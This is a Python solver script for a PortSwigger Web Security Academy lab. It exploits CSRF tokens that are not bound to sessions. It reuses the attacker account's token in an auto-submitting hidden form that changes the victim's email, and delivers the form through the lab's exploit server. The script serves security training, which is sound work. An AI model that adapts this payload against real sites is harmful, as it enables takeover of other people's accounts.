#!/usr/bin/env python3
"""
CSRF where token is not tied to user session
PortSwigger Web Security Academy -- Cross-Site Request Forgery (CSRF)

Companion script for the writeup: 04-token-not-tied-to-session.md

What this does:
    A wrong or missing token gets rejected cleanly here, so a purely automated
    probe can't tell "token not tied to session" apart from "token correctly
    enforced" -- both reject the same way. Instead, exactly like
    lab_token_not_tied() in CSRF.py, this logs in as the attacker account,
    pulls a fresh valid CSRF token from /my-account, and builds the exploit
    around the hypothesis that the application keeps one global pool of
    acceptable tokens rather than a per-session one: the attacker's own token,
    reused on a request under the victim's session, should be accepted.

Usage:
    python 04-token-not-tied-to-session.py <lab-url>

Requirements:
    pip install httpx
"""

import re
import sys
import time
import httpx


def _get_csrf(client: httpx.Client, path: str = "/my-account") -> str:
    r = client.get(path)
    m = re.search(r'name="csrf"\s+value="([^"]+)"', r.text)
    if m:
        return m.group(1)
    m = re.search(r'name=csrf\s+value=([^\s>]+)', r.text)
    return m.group(1) if m else ""


def _login(client: httpx.Client, username: str = "wiener", password: str = "peter") -> bool:
    csrf = _get_csrf(client, "/login")
    r = client.post("/login", data={"csrf": csrf, "username": username, "password": password})
    return r.status_code < 400 and "Log out" in r.text


def _get_exploit_server_url(client: httpx.Client) -> str:
    r = client.get("/")
    m = re.search(r'(https://exploit-[^\s"\'<>]+\.exploit-server\.net)', r.text)
    return m.group(1).rstrip("/") if m else ""


def _exploit_server_deliver(exploit_url: str, body: str, headers: str) -> bool:
    with httpx.Client(follow_redirects=True, timeout=20) as c:
        r = c.post(exploit_url, data={
            "responseFile": "/exploit",
            "responseBody": body,
            "responseHead": headers,
            "formAction": "DELIVER_TO_VICTIM",
        })
    return r.status_code < 400


def solve(lab_url: str) -> None:
    client = httpx.Client(
        base_url=lab_url, follow_redirects=True, timeout=20,
        headers={"User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36"},
    )
    client.get("/")

    exploit_url = _get_exploit_server_url(client)
    if not exploit_url:
        print("[-] No exploit server found.")
        return

    if not _login(client):
        print("[-] Login as wiener:peter failed.")
        return

    csrf = _get_csrf(client, "/my-account")
    print(f"[*] Attacker's CSRF token: {csrf[:8]}...")

    endpoint = f"{lab_url}/my-account/change-email"
    html = (
        '<html><body>\n'
        f'<form action="{endpoint}" method="POST">\n'
        f'  <input type="hidden" name="csrf" value="{csrf}" />\n'
        '  <input type="hidden" name="email" value="hacker@evil-user.net" />\n'
        '</form>\n'
        '<script>document.forms[0].submit();</script>\n'
        '</body></html>'
    )
    headers = "HTTP/1.1 200 OK\r\nContent-Type: text/html; charset=utf-8"
    print("[*] Technique: Foreign token: attacker's token reused")

    _exploit_server_deliver(exploit_url, html, headers)
    time.sleep(5)

    check = client.get("/")
    if "Congratulations" in check.text:
        print("[+] Lab solved -- victim's email was changed using the attacker's own (unbound) token.")
    else:
        print("[-] Not solved yet -- this target may bind tokens to sessions after all.")


if __name__ == "__main__":
    if len(sys.argv) != 2:
        print(f"Usage: python {sys.argv[0]} <lab-url>")
        sys.exit(1)
    solve(sys.argv[1].rstrip("/"))
